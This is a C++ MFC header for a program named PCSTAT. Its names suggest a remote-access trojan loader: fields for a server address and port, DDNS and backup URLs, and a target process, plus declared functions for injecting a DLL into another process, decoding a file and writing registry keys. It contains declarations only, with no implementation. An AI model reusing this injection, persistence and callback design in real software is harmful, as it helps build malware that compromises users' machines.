// PcStat.h : main header file for the PCSTAT application
//

#if !defined(AFX_PCSTAT_H__A1FCE898_D798_4400_86A6_277C3BEA9EC4__INCLUDED_)
#define AFX_PCSTAT_H__A1FCE898_D798_4400_86A6_277C3BEA9EC4__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#ifndef __AFXWIN_H__
	#error include 'stdafx.h' before including this file for PCH
#endif

#include "resource.h"		// main symbols

/////////////////////////////////////////////////////////////////////////////
// CPcStatApp:
// See PcStat.cpp for the implementation of this class
//

typedef struct _INITDLLINFO_
{
	WORD m_ServerPort;
	UINT m_ProcessId;
	UINT m_DllFileLen;
	char m_ProcessName[128];
	char m_KeyName[24];
	char m_CtrlFile[128];
	char m_StartFile[128];
	char m_ServerAddr[128];
	char m_ParentFile[256];
	char m_EventName[32];
	char m_DdnsUrl[128];
	char m_BakUrl[128];
	char m_IsUpdate;
	char m_ext[511];
	char m_reserved[4];//added by zhangyl to omit stack corruptions
}INITDLLINFO,*LPINITDLLINFO;

typedef BOOL (*PLAYWORK)(LPINITDLLINFO);

class CPcStatApp : public CWinApp
{
public:
	CPcStatApp();

	INITDLLINFO m_Info;
	HANDLE		m_ExitEvent;

	void InsertDllToProcess(HMODULE m_Module);
	BOOL CheckProcess(UINT &pId);
	BOOL GetInsertDllFile(char* pExeFileName , char* pFileName, int SrcFileLen);
	BOOL LoadInitInfo(char* pFileName);
	void MyRegSetKey(char* ValueName,char* Value, BOOL Flag);
	BOOL DeCodeFile(char* pFileData , char* pFileName, DWORD FileLen);
	void MyRegSetKeyPath(HKEY	RootKey,
						 char*	pKeyPath, 
						 char*	ValueName,
						 char*	Value);
// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CPcStatApp)
	public:
	virtual BOOL InitInstance();
	//}}AFX_VIRTUAL

// Implementation

	//{{AFX_MSG(CPcStatApp)
		// NOTE - the ClassWizard will add and remove member functions here.
		//    DO NOT EDIT what you see in these blocks of generated code !
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};


/////////////////////////////////////////////////////////////////////////////

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_PCSTAT_H__A1FCE898_D798_4400_86A6_277C3BEA9EC4__INCLUDED_)
